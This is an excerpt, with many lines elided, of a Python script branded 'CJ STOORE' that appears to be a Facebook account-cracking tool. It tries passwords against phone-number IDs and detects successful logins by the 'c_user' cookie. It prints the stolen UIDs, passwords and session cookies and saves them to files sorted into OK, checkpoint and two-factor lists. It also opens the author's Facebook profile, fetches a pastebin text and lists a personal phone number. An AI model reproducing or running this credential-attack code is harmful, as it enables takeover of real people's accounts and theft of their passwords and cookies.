...
os.system('am start https://www.facebook.com/profile.php?id=100088883140748')
...
try:
    ...
    os.system("xdg-open https://www.facebook.com/profile.php?id=100088883140748")
...
def subc():
   ...
   ses=requests.get("https://pastebin.com/qL424hPz").text
...

  ...
  AUTHOR   :   CJ STOORE
  FACEBOOK :   CJ STOORE
  LIFE STATUS  :   CJ STOORE
  FB GROUP  : CJ STOORE0001
  phone number : 0912848541                         
\033[1;91m=========================================================="""
...
def xyz():
    ...
    print('           \x1b[97m[\033[37;41m  CJ STOORE   \033[0;m] ')
    print(f"")
...
def Tabii():
    ...
    print(f"")
    clear()
    print(f"          \x1b[97m[\033[37;41m CJ STOORE   \033[0;m]")
    print(f"")
    linex()
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\033[1;32m[√]---------------------[CJ STOORE-OK😁]--------------------[√]\nNUMBER : '+uid+'\nUID   : '+cid+' √ '+ps+ '\nCOOKIE   : '+coki+'\n[√]---------------------------------------------------[√]')
                cek_apk(session,coki)
                open('/sdcard/CJ STOORE-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                cid=coki[24:39]
                Red = '\033[1;31m'
                print(f'\r{Red}[×]--------------------[CJ STOORE-CP😥]---------------------[×]\nNUMBER : '+uid+'\nUID   : '+cid+' √ '+ps+ '\n[×]---------------------------------------------------[×]\033[1;97m')
                open('/sdcard/CJ STOORE-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
                ...
                open('/sdcard/CJ STOORE-2F.txt', 'a').write(cid+' | '+ps+'\n')
                twf.append(cid)
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[CJ STOORE ] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass
